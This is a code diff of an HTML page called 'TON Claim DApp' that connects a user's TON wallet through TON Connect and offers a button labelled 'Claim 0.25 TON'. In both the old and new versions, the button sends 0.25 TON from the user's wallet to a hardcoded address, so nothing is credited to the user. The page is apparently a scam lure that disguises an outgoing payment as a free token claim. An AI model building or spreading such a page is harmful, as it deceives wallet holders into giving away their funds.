@@ -4,101 +4,75 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Claim DApp</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            background-color: #f0f2f5;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            border: none;
-            border-radius: 5px;
-            background-color: #0088cc;
-            color: white;
-            cursor: pointer;
-        }
-        button:disabled {
-            background-color: #ccc;
-        }
-    </style>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-    <div class="container">
+    <div style="text-align: center; padding: 20px;">
         <h1>TON Claim DApp</h1>
         <div id="wallet-section">
-            <button onclick="connectWallet()" id="connect-button">Connect Wallet</button>
-            <div id="wallet-address" style="display:none;"></div>
+            <button id="connect-button">Connect Wallet</button>
+            <div id="wallet-status"></div>
         </div>
-        <div id="claim-section" style="display:none;">
+        <div id="claim-section" style="display:none; margin-top: 20px;">
             <button onclick="claimTokens()" id="claim-button">Claim 0.25 TON</button>
         </div>
     </div>
 
     <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://hasan199191.github.io/my-telegram-bot/tonconnect-manifest.json',
-            buttonRootId: 'connect-button'
+            manifestUrl: 'https://hasan199191.github.io/my-telegram-bot/tonconnect-manifest.json'
         });
 
-        async function connectWallet() {
-            try {
-                await tonConnectUI.disconnect();
-                
-                const wallet = await tonConnectUI.connectWallet();
-                if (wallet) {
-                    document.getElementById('connect-button').style.display = 'none';
-                    document.getElementById('wallet-address').style.display = 'block';
-                    document.getElementById('wallet-address').innerHTML = `Connected: ${wallet.account.address}`;
-                    document.getElementById('claim-section').style.display = 'block';
-                }
-            } catch (error) {
-                console.error('Connection error:', error);
-                alert('Connection error: ' + error.message);
+        async function checkConnection() {
+            const wallet = await tonConnectUI.getWalletInfo();
+            if (wallet) {
+                document.getElementById('wallet-status').innerText = `Connected: ${wallet.account.address}`;
+                document.getElementById('claim-section').style.display = 'block';
+                document.getElementById('connect-button').style.display = 'none';
             }
         }
 
+        tonConnectUI.onStatusChange(async (wallet) => {
+            if (wallet) {
+                await checkConnection();
+            } else {
+                document.getElementById('claim-section').style.display = 'none';
+                document.getElementById('connect-button').style.display = 'block';
+                document.getElementById('wallet-status').innerText = '';
+            }
+        });
+
         async function claimTokens() {
             try {
+                const wallet = await tonConnectUI.getWalletInfo();
+                if (!wallet) {
+                    throw new Error('Wallet not connected');
+                }
+
                 const transaction = {
                     messages: [
                         {
                             address: "EQCBlhS0J_g7MZDJkBIb1mczcvbTmuiHXbi5smTxFWukVF5n",
-                            amount: "250000000", // 0.25 TON
+                            amount: "250000000"
                         }
                     ],
-                    validUntil: Date.now() + 300000 // 5 minutes
+                    validUntil: Date.now() + 300000
                 };
 
                 document.getElementById('claim-button').disabled = true;
                 const result = await tonConnectUI.sendTransaction(transaction);
-                alert('Transaction successful! Hash: ' + result.boc);
+                console.log('Transaction sent:', result);
+                alert('Transaction sent successfully!');
             } catch (error) {
                 console.error('Transaction error:', error);
-                alert('Transaction failed: ' + error.message);
+                alert(error.message || 'Transaction failed');
             } finally {
                 document.getElementById('claim-button').disabled = false;
             }
         }
 
-        // Handle wallet connection status
-        tonConnectUI.onStatusChange(wallet => {
-            if (!wallet) {
-                document.getElementById('connect-button').style.display = 'block';
-                document.getElementById('wallet-address').style.display = 'none';
-                document.getElementById('claim-section').style.display = 'none';
-            }
-        });
+        // Initial connection check
+        checkConnection();
     </script>
 </body>
 </html>
